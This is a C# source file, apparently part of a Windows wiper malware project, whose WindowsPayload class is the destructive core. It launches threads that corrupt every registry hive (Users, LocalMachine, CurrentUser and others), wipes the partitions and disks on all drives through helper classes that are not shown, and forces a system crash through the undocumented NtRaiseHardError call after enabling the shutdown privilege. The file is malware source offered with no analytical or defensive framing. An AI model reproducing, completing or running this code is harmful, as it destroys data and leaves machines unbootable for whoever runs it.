namespace wipercs;

using System.Runtime.InteropServices;
using Microsoft.Win32;

public class WindowsPayload
{
    // undocumented functions - see https://stackoverflow.com/a/49209086
    
    [DllImport("ntdll.dll")]
    private static extern uint RtlAdjustPrivilege
    (
        int privilege,
        bool bEnablePrivilege,
        bool isThreadPrivilege,
        out bool prevValue
    );
    
    [DllImport("ntdll.dll")]
    private static extern uint NtRaiseHardError
    (
        uint errorStatus, 
        uint numberOfParameters, 
        uint unicodeStringParameterMask, 
        IntPtr parameters, 
        uint validResponseOption, 
        out uint response
    );
    
    private static Thread RegfuckHelper(RegistryHive hive)
    {
        Thread temp = new Thread(() =>
        {
            RegFuck.initRegfuck(hive, 99);
        });
        temp.Start();

        return temp;
    }
    
    public static bool RF()
    {
        try
        {
            RegistryHive[] hives = { RegistryHive.Users, RegistryHive.CurrentConfig, RegistryHive.CurrentUser, RegistryHive.ClassesRoot, RegistryHive.LocalMachine };
            Thread[] threads = new Thread[hives.Length];
            for (int i = 0; i < hives.Length; i++)
            {
                var hive = hives[i];
                threads[i] = RegfuckHelper(hive);
            }
            
            foreach (var thread in threads)
            {
                thread.Join(); // wait for completion first
            }

            return true;
        }
        catch
        {
            return false;
        } 
    }
    
    public static bool PartWipe()
    {  
        int nDrives = DriveInfo.GetDrives().Length;

        for (int i = 0; i < nDrives; i++)
        {
            Wiper.PartWipe(i);
        }

        return true;
    }
    
    private static Thread DiskWipeHelper(DriveInfo drive)
    {
        Thread temp = new Thread(() =>
        {
            Wiper.initDiskWipe(drive.Name);
        });
        temp.Start();

        return temp;
    }
    
    public static bool DiskWipe()
    {
        try
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            Thread[] threads = new Thread[drives.Length];
            for (int i = 0; i < drives.Length; i++)
            {
                DriveInfo drive = drives[i];
                threads[i] = DiskWipeHelper(drive);
            }

            foreach (var thread in threads)
            {
                thread.Join(); // wait for completion first
            }

            return true;
        }
        catch
        {
            return false;
        }
    }

    public static void CrashSelf()
    {
        RtlAdjustPrivilege(19, true, false, out bool prevValue);
        NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, out uint response);
    } 
}